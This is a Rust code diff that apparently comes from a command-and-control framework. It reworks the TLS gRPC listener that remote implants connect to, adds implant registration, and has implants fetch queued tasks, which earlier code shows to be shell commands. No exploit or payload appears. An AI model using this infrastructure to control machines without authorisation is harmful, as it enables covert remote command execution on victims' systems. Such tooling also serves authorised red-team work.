@@ -1,62 +1,57 @@
-use crate::share::{Error, implantpb};
-use crate::server::db::Db;
-use implantpb::{ExecBody, Empty, TaskRequest, TaskResponse, TaskResult, TaskType};
+use crate::server::db;
+use crate::share::{implantpb, Error};
 use implantpb::implant_rpc_server::{ImplantRpc, ImplantRpcServer};
-use implantpb::task_response::TaskPayload;
+use implantpb::{Empty, Registration, TaskRequest, TaskResponse, TaskResult};
 use std::net::SocketAddr;
 use std::sync::Arc;
+use tokio::sync::Mutex;
 use tonic::transport::{Identity, Server, ServerTlsConfig};
 use tonic::{Request, Response, Status};
 
 // Listen for implants
 pub struct Listener {
-    addr: SocketAddr,
-    pub db: Arc<Db>
+    pub uuid: uuid::Uuid,
+    pub lhost: String,
+    pub lport: u16,
 }
 
 impl Listener {
-    pub fn new(addr: SocketAddr, db: Arc<Db>) -> Listener {
-        Listener{
-            addr,
-            db
-        }
-    }
+    pub fn new(addr: SocketAddr, db: Arc<Mutex<db::Db>>) -> Result<Listener, Error> {
+        // TODO: Auto generate certs instead of using hard-coded certs
+        let cert =
+            std::fs::read("certs/server.pem").map_err(|e| Error::FileReadErr("certs/server.pem".to_string(), e.to_string()))?;
+        let key =
+            std::fs::read("certs/server.key").map_err(|e| Error::FileReadErr("certs/server.key".to_string(), e.to_string()))?;
+        let identity = Identity::from_pem(cert, key);
 
-    // Start an https listener
-    // TODO: Auto generate certs instead of using hard-coded certs
-    pub fn start_listener(&self) -> Result<(), Error> {
-        let cert = std::fs::read("certs/server.pem")
-            .map_err(|e| Error::ListenerStartErr(e.to_string()))?;
-        let key = std::fs::read("certs/server.key")
-            .map_err(|e| Error::ListenerStartErr(e.to_string()))?;
-        let identity =  Identity::from_pem(cert, key);
-
-        let service = ImplantService::new(Arc::clone(&self.db));
+        let service = ImplantService::new(Arc::clone(&db));
         let tls_config = ServerTlsConfig::new().identity(identity);
         let svc = ImplantRpcServer::new(service);
 
         let server = Server::builder()
             .tls_config(tls_config)
-            .map_err(|e| Error::ListenerStartErr(e.to_string()))?
+            .map_err(|_| Error::ListenerStartErr(addr.ip().to_string(), addr.port()))?
             .add_service(svc)
-            .serve(self.addr);
+            .serve(addr);
 
-        tokio::spawn(async move {
-            server.await
-        });
+        tokio::spawn(async move { server.await });
 
-        Ok(())
+        Ok(Listener {
+            uuid: uuid::Uuid::new_v4(),
+            lhost: addr.ip().to_string(),
+            lport: addr.port(),
+        })
     }
 }
 
 // Define gRPC methods
 struct ImplantService {
-    // A thread-save vector of tasks
-    db: Arc<Db>
+    // Let the implants interact with the database
+    db: Arc<Mutex<db::Db>>,
 }
 
 impl ImplantService {
-    fn new(db: Arc<Db>) -> ImplantService {
+    fn new(db: Arc<Mutex<db::Db>>) -> ImplantService {
         ImplantService { db }
     }
 }
@@ -64,34 +59,34 @@ impl ImplantService {
 // Implement the protobuf services
 #[tonic::async_trait]
 impl ImplantRpc for ImplantService {
+    // Let an implant register with the server
+    async fn register(&self, request: Request<Registration>) -> Result<Response<Empty>, Status> {
+        let request = request.into_inner();
+        self.db
+            .lock()
+            .await
+            .register_implant(request)
+            .await
+            .map_err(|_| Status::unavailable(""))?;
+
+        Ok(Response::new(Empty {}))
+    }
 
     // Let an implant retrieve a task
-    async fn get_task(&self, _: Request<TaskRequest>) -> Result<Response<TaskResponse>, Status> {
-        // let task_payload = match self.tasks.lock() {
-        //     Ok(t) => t,
-        //     Err(_) => return Err(Status::unavailable("Could not lock tasks mutex"))
-        // }
-        // .get(0)
-        // .cloned()
-        let task_payload = self.db.get_task().await
-            .map_err(|x| Status::unavailable(format!("{:?}", x)))?
-            .map(|model| {
-                model.payload
-                    .map(|s| TaskPayload::ExecTask(ExecBody { cmd: s }))
-            })
-            .flatten();
+    async fn get_task(
+        &self,
+        request: Request<TaskRequest>,
+    ) -> Result<Response<TaskResponse>, Status> {
+        let implant_id = request.into_inner().implant_id;
 
-        // .map(|cmd| TaskPayload::ExecTask(ExecBody {
-            // cmd
-        // }));
+        let task = self
+            .db
+            .lock()
+            .await
+            .pop_task(implant_id)
+            .ok_or_else(|| Status::unavailable(""))?;
 
-        let response = TaskResponse {
-            task_id: 1,
-            task_type: TaskType::ExecTask as i32,
-            task_payload
-        };
-
-        Ok(Response::new(response))
+        Ok(Response::new(task))
     }
 
     // Let an implant return the results to the server
